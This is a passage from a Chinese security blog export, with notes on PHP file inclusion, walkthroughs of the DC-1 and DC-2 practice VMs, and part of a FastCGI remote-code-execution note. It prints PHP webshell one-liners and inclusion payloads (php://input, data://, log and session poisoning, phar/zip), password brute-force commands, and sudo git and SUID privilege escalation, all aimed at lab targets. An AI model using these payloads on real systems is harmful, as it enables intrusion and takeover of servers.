对allow_url_fopen不做要求</p><pre><code>&lt;?phpinfo();?&gt;&lt;?php system(&#39;whoami&#39;);?&gt;&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval(\$_POST[&#39;caidao&#39;];?&gt;)&quot;)?&gt;</code></pre><p>包含姿势：</p><pre><code>index.php?file=php://inputPOST:&lt;? phpinfo();?&gt;</code></pre><h5 id="php-input-（读取POST数据）"><a href="#php-input-（读取POST数据）" class="headerlink" title="php://input （读取POST数据）"></a>php://input （读取POST数据）</h5><p>​      碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p><p>测试代码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input");</span><span class="token delimiter">?></span></code></pre><img src="QQ截图20200203182852.png" style="zoom:67%;" /><h5 id="php-input-命令执行"><a href="#php-input-命令执行" class="headerlink" title="php://input(命令执行)"></a>php://input(命令执行)</h5><p>测试代码：</p><pre><code>&lt;?php    $filename  = $_GET[&#39;filename&#39;];    include($filename);?&gt;</code></pre><p>条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行；</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200203183726.png" alt=""></p><h5 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h5><p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的。</p><p>利用条件：</p><p>php版本大于等于php5.2<br> allow_url_fopen = On<br> allow_url_include = On</p><p>示例1：</p><pre><code>/index2.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/9272355-5449b681b9c47ddb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p><p>执行命令：</p><pre><code>index2.php?file=data:text/plain;&lt;?php system(&quot;whoami&quot;);?&gt;</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/9272355-0fce621191e72481.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/885" alt="img"></p><p>示例2：</p><pre><code>/index2.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><p>加号<code>+</code>的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8+</code>的base64解码为：<?php phpinfo() ?></p><p><strong>包含session</strong></p><p>利用条件：session文件路径已知，且其中内容部分可控。</p><p>思路：结合phpmyadmin,因为phpmyadmin每次登录时，会带上session。</p><p><img src="D:%5C%E5%9B%BE%E7%89%87%5C9272355-dd5195fec4210a53.png" alt=""></p><p>session文件的绝对路径可在phpinfo中查看，session.save_path</p><p><img src="https://upload-images.jianshu.io/upload_images/9272355-1e7dd8fd1a028711.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/608" alt="img"></p><p>常见的php-session存放位置还有这几个：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sess_PHPSESSID<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sess_PHPSESSID<span class="token operator">/</span>tmp<span class="token operator">/</span>sess_PHPSESSID<span class="token operator">/</span>tmp<span class="token operator">/</span>sessions<span class="token operator">/</span>sess_PHPSESSID</code></pre><p>使用以下命令可查看到session文件中的登录信息</p><pre class=" language-csharp"><code class="language-csharp">strings <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php5<span class="token operator">/</span>sess_258c1be1b00d080bddc58d2896460542facb6f1f <span class="token operator">|</span> grep root</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/9272355-940bb1d740bd0d47.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/723" alt="img"></p><p>登录phpmyadmin时，用户名输入一句话木马，再包含session文件，可getshell</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'root'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><p><img src="https://upload-images.jianshu.io/upload_images/9272355-c833b1fd110b6170.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/9272355-5304d206d0b1fcc8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/729" alt="img"></p><p>使用菜刀连接<br> <a href="http://192.168.1.127/dvwa/vulnerabilities/fi/?page=../../../../../../var/lib/php5/sess_6cf7f14ec1e50c6b2f6d4a8ec671e7aaf92c6c4c" target="_blank" rel="noopener">http://192.168.1.127/dvwa/vulnerabilities/fi/?page=../../../../../../var/lib/php5/sess_6cf7f14ec1e50c6b2f6d4a8ec671e7aaf92c6c4c</a><br> 在浏览器里有你的cookie所以你可以直接去访问对应的文件包含页面，用菜刀的话是没有cookie的所以你没有办法去访问文件包含页面也就是fi那个页面。所以说会自动跳转到登录页面，显示200ok</p><p>加上cookie之后在重新连接，成功连接</p><p><img src="https://upload-images.jianshu.io/upload_images/9272355-44a9d0f1054d26b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/790" alt="img"></p><h5 id="phar伪协议"><a href="#phar伪协议" class="headerlink" title="phar伪协议"></a>phar伪协议</h5><ul><li><p>利用条件：php版本大于等于php5.3.0</p></li><li><p>这个参数就是php解压缩包的一个函数，不管后缀是什么，都会被当做压缩包来解压。</p><p>用法：?file=phar://压缩包/内部文件 phar://xxx.png/shell.php </p><p>注意： PHP &gt; =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 </p></li><li><p>姿势：假设有个文件phpinfo.txt，其内容为<?php phpinfo(); ?>，打包成zip压缩包，如下：</p></li></ul><p><img src="D:%5C%E5%9B%BE%E7%89%87%5C9272355-041eece378dca1e4.png" alt=""></p><p>指定绝对路径：</p><pre><code>index2.php?file=phar://C:\phpStudy\WWW\FileInclusion\phpinfo.zip\phpinfo.txt</code></pre><p>或者利用相对路径（这里phpinfo.zip就在当前目录下）</p><pre><code>index2.php?file=phar://phpinfo.zip/phpinfo.txt</code></pre><p><img src="D:%5C%E5%9B%BE%E7%89%87%5C9272355-489da319d283d845.png" alt=""></p><h5 id="zip：-伪协议"><a href="#zip：-伪协议" class="headerlink" title="zip：//伪协议"></a>zip：//伪协议</h5><ul><li><p>php版本大于等于php5.3.0</p></li><li><p>zip伪协议和phar协议类似，但是用法不一样。</p></li><li><p>用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php</p></li><li><p>条件： PHP &gt; =5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p></li></ul><pre><code>index2.php?file=zip://C:\phpStudy\WWW\FileInclusion\phpinfo.zip%23phpinfo.txt</code></pre><h3 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h3><p>当我们没有上传点，并且也没有url_allow_include功能时，我们就可以考虑包含服务器的日志文件。<br>利用思路也比较简单，当我们访问网站时，服务器的日志中都会记录我们的行为，当我们访问链接中包含PHP一句话木马时，也会被记录到日志中。<br>这时候我们如果知道服务器的日志位置，我们可以去包含这个文件从而拿到shell。其实整个“包含日志文件漏洞利用”最关键的就是找日志存放的“物理路径”，只要找到日志的物理存放路径，一切就可以按部就班的完成利用了。<br>利用的条件：</p><ul><li>1.日志的物理存放路径</li><li>2.存在文件包含漏洞</li></ul><p>获取日志存放路径</p><p>（一）日志默认路径</p><p>(1) apache+Linux日志默认路径</p><pre class=" language-undefined"><code class="language-undefined">    /etc/httpd/logs/access_log</code></pre><p>或者</p><pre class=" language-bash"><code class="language-bash">    /var/log/httpd/access_log</code></pre><p>(2) apache+win2003日志默认路径</p><pre class=" language-cpp"><code class="language-cpp">    D<span class="token operator">:</span>\xampp\apache\logs\access<span class="token punctuation">.</span>log    D<span class="token operator">:</span>\xampp\apache\logs\error<span class="token punctuation">.</span>log</code></pre><p>(3) IIS6.0+win2003默认日志文件</p><pre class=" language-undefined"><code class="language-undefined">    C:\WINDOWS\system32\Logfiles</code></pre><p>(4) IIS7.0+win2003 默认日志文件</p><pre class=" language-undefined"><code class="language-undefined">    %SystemDrive%\inetpub\logs\LogFiles</code></pre><p>(5) nginx 日志文件</p><pre class=" language-bash"><code class="language-bash">    日志文件在用户安装目录logs目录下            以我的安装路径为例/usr/local/nginx,            那我的日志目录就是在/usr/local/nginx/logs里</code></pre><p>首先，我们直接使用浏览器来构造“php一句话报错请求信息”服务自动记录此一句话信息到服务器日志文件中；<br>具体构造内容：</p><pre class=" language-xml"><code class="language-xml"> http://127.0.0.1:81/FileInclusion/index2.php?file=<span class="token prolog">&lt;?php @eval($_POST[c]);?></span></code></pre><p><img src="https:////upload-images.jianshu.io/upload_images/9272355-f9f0db6a9d7ff53a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/964" alt="img"></p><p>（2）测试结果：失败<br>利用文件包含漏洞直接访问“服务日志文件”，发现文件包含漏洞并未对构造的php一句话进行正常解析，观察发现是构造的PHP一句话中的相关字符在记录进日志文件后，相关的字符被转码了，导致PHP解析失败，具体失败原因见“失败原因分析”</p><p><img src="https:////upload-images.jianshu.io/upload_images/9272355-738380f7e8b09e46.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1195" alt="img"></p><p>image.png（3）失败原因分析<br>一句话写入日志文件的利用过程是，利用浏览器直接构造一个关于请求资源的报错信息，消息中包含依据。报错信息服务自动记录到日志文件，但实际测试发现写入日志文件内的报错信息发生了字符转码：<br>日志文件内容如上图所示：</p><pre class=" language-ruby"><code class="language-ruby">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">81</span><span class="token operator">/</span><span class="token constant">FileInclusion</span><span class="token operator">/</span>index2<span class="token punctuation">.</span>php<span class="token operator">?</span>page<span class="token operator">=</span><span class="token operator">%</span>3C<span class="token operator">?</span>php<span class="token operator">%</span><span class="token number">20</span><span class="token variable">@eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">%</span>3E</code></pre><pre class=" language-rust"><code class="language-rust">               <span class="token string">"&lt;"</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">-></span> 大于号被转码为了 <span class="token operator">%</span>3C                <span class="token string">">"</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">-></span> 小于号被转码为了 <span class="token operator">%</span>3E                <span class="token string">" "</span>   <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">-></span> 空格被转码为了 <span class="token operator">%</span><span class="token number">20</span></code></pre><p>最后写入到日志文件中的一句话就变成了 %3C?php%20@eval($_POST[c]);?%3E。</p><p>（4） 失败总结<br>浏览器直接构造的PHP一句话中特殊字符，会被浏览器自动进行URL转义，导致最终写入日志文件中的PHP一句话包含了这些特殊字符，而这些转码后的编码PHP并不能进行正常的解析。<br>（5）构造一句话，写入日志文件测试记录<br>burpsuit 代理抓包改包构造一句话写入日志文件<br>（1） burpsuit 代理抓包，修改浏览器转码字符，写入正确的php一句话木马到服务器日志文件。</p><p><img src="https:////upload-images.jianshu.io/upload_images/9272355-ff2a0beae4cc4468.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p><p>（2） 测试记录：成功<br>通过文件包含直接访问服务日志文件，发现一句话被执行成功；</p><p><img src="https:////upload-images.jianshu.io/upload_images/9272355-f5d368a6f62b9802.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/889" alt="img"></p><p>在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log，还可以包含Apache的错误访问日志</p><p>首先，构造一个会报错的访问链接，将利用代码（PHP一句话）写入错误日志记录中</p><pre class=" language-ruby"><code class="language-ruby">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">81</span><span class="token operator">/</span><span class="token constant">FileInclusion</span><span class="token operator">/</span>index2<span class="token punctuation">.</span>php<span class="token operator">%</span>3C<span class="token operator">?</span>php<span class="token operator">%</span><span class="token number">20</span><span class="token variable">@eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">%</span>3E</code></pre><p>这个链接直接访问的话，一句话会被编码成%3C?php%20@eval($_POST[c]);?%3E，所以需要使用Burp suite改一下包。</p><p><img src="https:////upload-images.jianshu.io/upload_images/9272355-e094a1b3f7e98f45.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p><p>对所截获的包进行修改，点击go，返回403报错，服务器错误日志文件成功将此次记录到error.log中<br>我们根据日志的路径构造访问路径:</p><pre class=" language-cpp"><code class="language-cpp">http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">:</span><span class="token number">81</span><span class="token operator">/</span>FileInclusion<span class="token operator">/</span>index2<span class="token punctuation">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span>C<span class="token operator">:</span><span class="token operator">/</span>phpStudy<span class="token operator">/</span>Apache<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span>log</code></pre><p>客户端连接，获取一句话木马</p><h5 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h5><p>利用的条件：</p><p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</p><p>姿势：<br>用ssh连接：<br><a href="https://www.jianshu.com/p/7cbc878d64ae" target="_blank" rel="noopener">参考这个网站</a></p><h5 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h5><p><a href="https://vulhub.org/#/environments/php/inclusion/" target="_blank" rel="noopener">参考这个网站</a></p><hr><p><strong>参考文章</strong>：<a href="https://www.jianshu.com/p/8803aff98bfa" target="_blank" rel="noopener">https://www.jianshu.com/p/8803aff98bfa</a></p><p>​                    <a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/182280.html</a></p>]]></content>
      
      
      <categories>
          
          <category> web漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-2靶机学习</title>
      <link href="/2020/04/03/dc-2-ba-ji-xue-xi/"/>
      <url>/2020/04/03/dc-2-ba-ji-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="DC-2靶机测试"><a href="#DC-2靶机测试" class="headerlink" title="DC-2靶机测试"></a>DC-2靶机测试</h2><p>[TOC]</p><h4 id="第一步、下载DC-2靶机并进行主机发现"><a href="#第一步、下载DC-2靶机并进行主机发现" class="headerlink" title="第一步、下载DC-2靶机并进行主机发现"></a>第一步、下载DC-2靶机并进行主机发现</h4><p>我们下载安装DC-2靶机。设置.nat连接模式。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205133827.png" alt=""></p><p>我们使用netdiscover进行主机发现。</p><pre><code>netdiscover -i eth0 -r 192.168.153.0/24</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205102253.png" alt=""></p><p>确定了靶机IP为192.168.153.136</p><h4 id="第二步、信息收集"><a href="#第二步、信息收集" class="headerlink" title="第二步、信息收集"></a>第二步、信息收集</h4><p>我们使用nmap 进行信息收集</p><pre><code>nmap -A -p 1-65535 192.168.153.136 -T4</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205111215.png" alt=""></p><p>我们发现靶机上开放着80端口，并且部署了apache服务器，7744开启了SSH服务。提示是一个wordpress站点</p><p>我们需要首先在host文件下添加<a href="http://dc-2/域名，然后使用浏览器去访问该域名。" target="_blank" rel="noopener">http://dc-2/域名，然后使用浏览器去访问该域名。</a></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205111308.png" alt=""></p><p>我们使用Wappalyzer进行指纹识别。确定了是一个WordPress的站点。</p><h4 id="第三步、使用Wpscan扫描"><a href="#第三步、使用Wpscan扫描" class="headerlink" title="第三步、使用Wpscan扫描"></a>第三步、使用Wpscan扫描</h4><p>​       该扫描器可以实现获取<code>Wordpress</code>站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。同时还可以实现对未加防护的<code>Wordpress</code>站点暴力破解用户名密码。</p><p>我们使用命令扫描网站内的用户名</p><pre><code>wpscan --url dc-2 -e u</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205132051.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205132034.png" alt=""></p><p>获取到用户名后，我们思考能否爆破密码。</p><p>我们首先使用crel收集网页的信息</p><p>​    Cewl：CeWL是一款以爬虫模式在指定URL上收集单词的工具，可以将它收集到的单词纳入密码字典，以提高密码破解工具的成功率。</p><pre><code>cewl dc-2 -w dict.txt</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205111938.png" alt=""></p><p>得到密码字典后我们继续回到wpscan进行密码爆破、</p><pre><code>wpscan --url dc-2 -P dict.txt</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205132515.png" alt=""></p><p>我们得到了两个登录的账号和密码。</p><h4 id="第四步、登录后台"><a href="#第四步、登录后台" class="headerlink" title="第四步、登录后台"></a>第四步、登录后台</h4><p>我们通过wpscan发现了默认的后台登录页面。（wp-login.php)</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205132755.png" alt=""></p><p>我们使用jerry用户进行登录。在其账号中发现了flag2.txt的信息。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205132930.png" alt=""></p><p>我们翻译一下：</p><p>如果你不能利用WordPress并抄近路，还有别的办法。           </p><p>   希望你能找到另一个切入点。</p><h4 id="第五步、登录ssh"><a href="#第五步、登录ssh" class="headerlink" title="第五步、登录ssh"></a>第五步、登录ssh</h4><pre><code> 我们尝试使用上面两个账户来登陆ssh。首先尝试tom的账户。</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200217113658.png" alt=""></p><p>可以登陆，ls一下可以看到flag3。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200217113757.png" alt=""></p><p>​    但是登陆使用的shell是rBash，功能受到严重限制以至于cat命令都无法使用，所以需要想办法绕过限制。我们先尝试把shell切换为/bin/sh，成功了。继续尝试使用cat来查看flag3中的内容，提示不能找到命令，这时候原因应该是没有将cat命令的目录添加到$PATH中，于是添加之。然后使用cat查看flag3.txt中的内容。<br>rBash和sh shell命令</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205115512.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205115956.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205120014.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205120104.png" alt=""></p><h4 id="第六步、Git提权获得最终flag"><a href="#第六步、Git提权获得最终flag" class="headerlink" title="第六步、Git提权获得最终flag"></a>第六步、Git提权获得最终flag</h4><p>我们先切换到jerry用户，在jerry的家目录下找到flag4.txt</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205120330.png" alt=""></p><p>flag4 提示我们可以使用git，我们可以通过git来提权</p><p>sudo -l 我们可以看到无需root权限，jerry 可以使用 git ！</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200217123533.png" alt=""></p><p>我们可以利用suid 进行提权</p><p>SUID可以让调用者以文件拥有者的身份运行该文件</p><pre><code>sudo git -p --help</code></pre><p>输入!/bin/bash 获得root权限</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200217123719.png" alt=""></p><p>我们在root目录下找到最后一个flag。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200217123829.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 靶机学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC-2靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-1靶机学习</title>
      <link href="/2020/04/03/dc-1-ba-ji-xue-xi/"/>
      <url>/2020/04/03/dc-1-ba-ji-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="DC-1靶机学习"><a href="#DC-1靶机学习" class="headerlink" title="DC-1靶机学习"></a>DC-1靶机学习</h2><h4 id="第一步、搭建dc-1和kali虚拟机，使用-nat模式"><a href="#第一步、搭建dc-1和kali虚拟机，使用-nat模式" class="headerlink" title="第一步、搭建dc-1和kali虚拟机，使用.nat模式"></a>第一步、搭建dc-1和kali虚拟机，使用.nat模式</h4><p><img src="QQ%E6%88%AA%E5%9B%BE20200204102843.png" alt=""></p><p>我们进入DC-1的登录界面，然后回到kali攻击机准备入侵。</p><h4 id="第二步、扫描出靶机的ip地址"><a href="#第二步、扫描出靶机的ip地址" class="headerlink" title="第二步、扫描出靶机的ip地址"></a>第二步、扫描出靶机的ip地址</h4><p>1.我们可以使用nmap进行二层的主机发现</p><p><code>nmap -sn 192.168.153.0/24</code></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204103154.png" alt=""></p><p>2.使用netdiscover进行主机发现</p><p><code>netdiscover -i eth0 -r 192.168.153.0/24</code></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204114216.png" alt=""></p><p>3.使用arp-scan进行主机发现</p><p><code>arp-scan -l</code></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204114720.png" alt=""></p><h4 id="第三步、靶机的信息收集"><a href="#第三步、靶机的信息收集" class="headerlink" title="第三步、靶机的信息收集"></a>第三步、靶机的信息收集</h4><p>我们使用nmap对该靶机进行扫描。</p><pre><code>nmap -A -p 1-65535 192.168.153.150</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200204103823.png" alt=""></p><p>我们发现开放的80(tcp) 22（ssh) 111(tcp)端口，并且可以看出使用的CMS为Drupal7。</p><p>我们从浏览器访问该IP的80页面</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204104045.png" alt=""></p><p>我们使用Wappalyzer进行网站的指纹识别，得到更详细的信息。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204115356.png" alt=""></p><h4 id="第四步、使用msf入侵目标系统"><a href="#第四步、使用msf入侵目标系统" class="headerlink" title="第四步、使用msf入侵目标系统"></a>第四步、使用msf入侵目标系统</h4><p>进入msf控制台，使用search命令查找关于Drupal的历史漏洞。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204104359.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204104445.png" alt=""></p><p>我们选择极好等级的并且日期较近的漏洞进行利用，可以提高成功概率。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204104853.png" alt=""></p><p>我们使用set命令设置目标机器，使用run或exploit命令开始攻击。</p><p>看到出现meterpreter证明成功入侵系统。</p><h4 id="第五步、获取flag-1"><a href="#第五步、获取flag-1" class="headerlink" title="第五步、获取flag 1"></a>第五步、获取flag 1</h4><p>我们执行shell命令获得shell.</p><p>ls后发现目录下存在flag1.txt.</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204105001.png" alt=""></p><p>我们cat flag1.txt读取内容。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204105042.png" alt=""></p><p>翻译：每一个好的CMS都需要一个配置文件，你也一样。</p><h4 id="第六步、获取flag2-txt"><a href="#第六步、获取flag2-txt" class="headerlink" title="第六步、获取flag2.txt"></a>第六步、获取flag2.txt</h4><p>我们通过百度查询到该cms的配置文件 ：/var/www/sites/default</p><p>我们使用cd命令切换到该目录，读取目录下的setting.php文件。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204110426.png" alt=""></p><p>我们找到了flag2.txt并读取内容。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204110442.png" alt=""></p><p>翻译：暴力和字典攻击不是获取访问权限的唯一方式。并且将需要访问权限。并且给出了mysql数据库的账号和密码。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204110617.png" alt=""></p><h4 id="第七步、获取flag4-txt"><a href="#第七步、获取flag4-txt" class="headerlink" title="第七步、获取flag4.txt"></a>第七步、获取flag4.txt</h4><p>我们可以先看一下/etc/passwd中的内容，意外发现了flag4的账号名</p><p>/etc/passwd 储存了用户重要信息，一般可读但不可写</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204115756.png" alt=""></p><p>我们尝试使用john+hydra进行暴力破解。</p><pre><code>hydra -l flag4 -p/Users/john-1.8.0/run/password.lst ssh://192.168.153.150</code></pre><p>-l 指定用户名<br> -P 加载密码字典（这里使用了John the Ripper安装后提供的密码本，一般在john-1.8.0/run/password.lst)<br> ssh://ip 指定使用协议和ip地址</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204120356.png" alt=""></p><p>得到了flag4账号对应的密码为orange</p><p>我们使用kali ssh远程登录 </p><pre><code>ssh flag4@192.168.153.150</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200204120529.png" alt=""></p><p>ls后发现flag4.txt文件，尝试cat读取。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204121509.png" alt=""></p><p>翻译:您可以使用相同的方法在根目录中查找或访问标志吗?可能。但也许不是那么容易。或许是这样？</p><p>可能我们需要提权。</p><h4 id="第八步、获得-thefinalflag-txt"><a href="#第八步、获得-thefinalflag-txt" class="headerlink" title="第八步、获得 thefinalflag.txt"></a>第八步、获得 thefinalflag.txt</h4><p>由flag3.txt可知，我们需要获取root权限才能读取最终的flag</p><p>由于对提取部分知识不够，参考别人的教程要利用suid提权</p><p>suid是Linux的一个权限机制，在执行使用suid权限的文件时候，调用者会暂时有该文件的root权限。</p><p>首先我们使用<code>find / -perm -4000 2&gt;/dev/null</code>发现系统上运行的所有SUID可执行文件。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204122116.png" alt=""></p><p>发现find命令被设置为suid权限位</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204122420.png" alt=""></p><p>之后我们通过find命令提权，使用whoami查看用户权限。</p><p>之后进入 root目录下查看最终的flag.</p><p><strong>完</strong></p>]]></content>
      
      
      <categories>
          
          <category> 靶机学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC-1靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>其他中间件漏洞</title>
      <link href="/2020/04/03/qi-ta-zhong-jian-jian-lou-dong/"/>
      <url>/2020/04/03/qi-ta-zhong-jian-jian-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="其它中间件相关漏洞"><a href="#其它中间件相关漏洞" class="headerlink" title="其它中间件相关漏洞"></a>其它中间件相关漏洞</h2><h4 id="FastCGI未授权访问、任意命令执行"><a href="#FastCGI未授权访问、任意命令执行" class="headerlink" title="FastCGI未授权访问、任意命令执行"></a>FastCGI未授权访问、任意命令执行</h4><p><strong>1、 漏洞简介及成因</strong></p><p>服务端使用fastcgi协议并对外网开放9000端口，可以构造fastcgi协议包内容，实现未授权访问服务端.php文件以及执行任意命令。</p><p>参考P牛文章：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><p><strong>2、 漏洞复现</strong></p><p>使用vulhub实验环境，启动实验环境。</p><pre><code>cd /vulhub/fpmdocker-compose build &amp;&amp; docker-compose up -d</code></pre><p><strong>EXP</strong>:<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p><p>在攻击机使用命令python fpm.py 192.168.237.136 /etc/passwd，观察返回结果。</p><p><a href="https://image.3001.net/images/20181216/1544955569_5c1626b181057.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955569_5c1626b181057.png!small" alt="img"></a></p><p>由于访问非*.PHP文件，所以返回结果403。</p><p>使用命令执行一个默认存在的 php 文件。</p><pre><code>python fpm.py 192.168.237.136 /usr/local/lib/php/PEAR.php</code></pre><p><a href="https://image.3001.net/images/20181216/1544955581_5c1626bd94566.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955581_5c1626bd94566.png!small" alt="img"></a></p><p>利用命令进行任意命令执行复现。</p><pre><code>python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `pwd`; ?&gt;&#39;python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `ifconfig`; ?&gt;&#39;python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c 